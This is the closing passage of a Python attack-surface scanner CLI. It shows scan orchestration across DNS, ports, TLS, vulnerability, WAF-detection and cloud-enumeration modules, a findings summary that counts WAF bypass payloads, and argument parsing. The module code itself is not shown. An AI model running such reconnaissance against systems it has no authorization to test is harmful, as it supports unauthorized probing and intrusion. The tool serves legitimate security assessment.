        results["tls"] = run_tls(tls_hosts[:8])

    if "tech" in modules:
        targets = http_urls or [f"https://{h}" for h in hosts_to_probe[:5]]
        results["tech"] = run_tech(targets[:10])

    if "vulns" in modules:
        targets = http_urls or [f"https://{h}" for h in hosts_to_probe[:5]]
        results["vulns"] = run_vulns(targets[:10])

    if "emailsec" in modules:
        results["emailsec"] = run_emailsec(target)

    if "firewall" in modules:
        targets = http_urls or [f"https://{h}" for h in hosts_to_probe[:5]]
        results["firewall"] = run_firewall(targets[:8])

    if "cloudenum" in modules:
        results["cloudenum"] = run_cloudenum(target)

    duration = time.time() - start
    hr()
    print(f"{C.BOLD}{C.BMAGENTA}\n[✓] Scan complete in {duration:.2f}s{C.RESET}\n")
    # Summary
    print(f"  {C.CYAN}{'CATEGORY':<26}{'FINDINGS':<12}{C.RESET}")
    print(f"  {C.GRAY}{'─'*38}{C.RESET}")
    counts = {
        "DNS records": len(results.get("dns",{}).get("records",[])),
        "Subdomains": len(results.get("subdomains",{}).get("subdomains",[])),
        "Open ports": len(results.get("ports",{}).get("ports",[])),
        "HTTP services": len(results.get("http",{}).get("hosts",[])),
        "TLS certificates": len(results.get("tls",{}).get("certs",[])),
        "Technologies": sum(len(h["technologies"]) for h in results.get("tech",{}).get("hosts",[])),
        "Vulnerabilities": sum(len(h["findings"]) for h in results.get("vulns",{}).get("hosts",[])),
        "Email sec issues": len(results.get("emailsec",{}).get("findings",[])),
        "WAFs detected": sum(len(h["waf"]) for h in results.get("firewall",{}).get("hosts",[])),
        "Bypass payloads": results.get("firewall",{}).get("total_payloads",0),
        "Cloud assets": len(results.get("cloudenum",{}).get("buckets",[])) + len(results.get("cloudenum",{}).get("repos",[])),
    }
    for k, v in counts.items():
        print(f"  {k:<26}{str(v):<12}")
    print()
    if output == "json":
        print(f"{C.GRAY}--- JSON REPORT ---{C.RESET}")
        print(_json.dumps({"target": target, "duration": duration, "results": results}, indent=2, default=str))

# ─── CLI ────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="EASM — External Attack Surface Management (Python Edition)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Examples:
  python3 easm.py scan example.com
  python3 easm.py scan example.com --modules dns,http,vulns
  python3 easm.py scan example.com --ports 80,443,8080
  python3 easm.py scan example.com --no-subdomains
  python3 easm.py scan example.com --output json

Built by Rudresha RK — Cybersecurity Undergraduate
""")
    sub = parser.add_subparsers(dest="cmd")
    sp = sub.add_parser("scan", help="Run an attack-surface scan")
    sp.add_argument("target", help="Target domain or host")
    sp.add_argument("-m","--modules", help=f"Comma-separated modules: {','.join(ALL_MODULES)}")
    sp.add_argument("-p","--ports", help="Comma-separated ports/ranges (e.g. 80,443,8000-8100)")
    sp.add_argument("--no-subdomains", action="store_true", help="Skip subdomain enumeration")
    sp.add_argument("-t","--timeout", type=int, default=4000, help="Per-host timeout in ms")
    sp.add_argument("-c","--concurrency", type=int, default=50, help="Scan concurrency")
    sp.add_argument("-o","--output", choices=["table","json"], default="table", help="Output format")
    # Shorthand
    parser.add_argument("target_shorthand", nargs="?", help="Target (shorthand for scan)")
    args = parser.parse_args()

    if args.cmd == "scan":
        target = args.target
        modules = args.modules.split(",") if args.modules else list(ALL_MODULES)
        # Validate modules
        bad = [m for m in modules if m not in ALL_MODULES]
        if bad:
            print(f"{C.RED}Unknown module(s): {', '.join(bad)}{C.RESET}")
            print(f"{C.GRAY}Available: {', '.join(ALL_MODULES)}{C.RESET}")
            sys.exit(1)
        # Parse ports
        if args.ports:
            ports = []
            for p in args.ports.split(","):
                p = p.strip()
                if "-" in p:
                    a, b = p.split("-")
                    ports.extend(range(int(a), int(b)+1))
                elif p:
                    ports.append(int(p))
        else:
            ports = DEFAULT_PORTS
        run_scan(target, modules, ports, args.no_subdomains, args.timeout,
                 args.concurrency, args.output)
    elif args.target_shorthand:
        run_scan(args.target_shorthand, list(ALL_MODULES), DEFAULT_PORTS, False, 4000, 50, "table")
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
